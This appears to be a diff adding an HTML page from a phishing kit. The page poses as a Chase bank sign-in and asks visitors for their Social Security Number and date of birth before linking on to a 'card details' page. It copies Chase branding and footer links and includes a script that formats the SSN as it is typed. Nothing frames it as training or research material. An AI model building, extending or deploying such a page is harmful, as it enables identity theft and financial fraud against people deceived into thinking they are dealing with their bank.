@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+          <meta charset="UTF-8">
+          <meta http-equiv="X-UA-Compatible" content="IE=edge">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <link rel="stylesheet" href="./fontsawesome/css/all.css">
+          <link rel="stylesheet" href="./main.css">
+          <link rel="stylesheet" href="./mobile.css">
+          <title>Document</title>
+</head>
+<body>
+          
+<header>
+<main>
+          <div class="logo">
+                    <h1>CHASE  <i class="fa-brands fa-instalod"></i></h1>
+          </div>
+
+          <form action="">
+                    <label for=""><br>
+                              <input type="tel" name="ssn" placeholder="Social Security Number" maxlength="9" required onBlur="myFunc()" id="ssn">
+                    
+                    </label>
+                    <br>
+                    <label for=""> 
+                              <br>
+                              <input type="date" name="Date" placeholder="Date Of Birth" required maxlength="5">
+                              
+                    </label>
+                
+                   
+
+
+                    <button type="submit"> <a href="./carddetails.html"> Sign in</a></button>
+          </form>
+
+
+</main>
+
+
+</header>
+<footer>
+          <div class="foot">
+
+                    <div class="social-links">
+                           
+
+                                     <p>  Follow Us:</p> 
+                           
+                                     <div class="social">
+
+                                               <div class="fa">
+                  
+                                                         <i class="fa-brands fa-square-facebook"></i>
+                                               </div>
+                                               <div class="ins">
+                  
+                                                         <i class="fa-brands fa-square-instagram"></i>
+                                               </div>
+                                               <div class="twi">
+                  
+                                                         <i class="fa-brands fa-twitter"></i>
+                                               </div>
+                                               <div class="you">
+                  
+                                                         <i class="fa-brands fa-youtube"></i>
+                                               </div>
+                                               <div class="lin">
+                  
+                                                         <i class="fa-brands fa-linkedin-in"></i>
+                                               </div>
+                                     </div>
+                    </div>
+          </div>
+<div class="line">
+
+</div>
+
+<div class="links-2">
+                    <li><a href="">Contacts</a></li>
+                    <li><a href="">Privacy</a></li>
+                    <li><a href="">Security</a></li>
+                    <li><a href="">Terms of Use</a></li>
+                    <li><a href="">Accessibility</a></li>
+                    <li><a href="">Safe Act: Chase Mortgage Loan Originators</a></li>
+                    <li><a href="">Fair Lending</a></li>
+                    <li><a href="">About Chase</a></li>
+                    <li><a href="">J.P. Morgan</a></li>
+                    <li><a href="">JP Morgan Chase & Co.</a></li>
+                    <li><a href="">Careers</a></li>
+                    <li><a href="">Español</a></li>
+                    
+</div>
+<div class="links-3">
+<li><a href="">Chase Canada</a></li>
+<li><a href="">Site map</a></li>
+<li><a href="">Member FDIC</a></li>
+<li><a href="">Equal Housing Lender</a></li>
+</div>
+<p id="copy"> &copy; 2016 JPMorgan Chase & Co</p>
+
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+          function myFunc() {
+   var patt = new RegExp("\d{3}[\-]\d{2}[\-]\d{4}");
+   var x = document.getElementById("ssn");
+   var res = patt.test(x.value);
+   if(!res){
+    x.value = x.value
+        .match(/\d*/g).join('')
+        .match(/(\d{0,3})(\d{0,2})(\d{0,4})/).slice(1).join('-')
+        .replace(/-*$/g, '');
+   }
+}
+
+
+
+
+       
+</script>
+
+</body>
+</html>
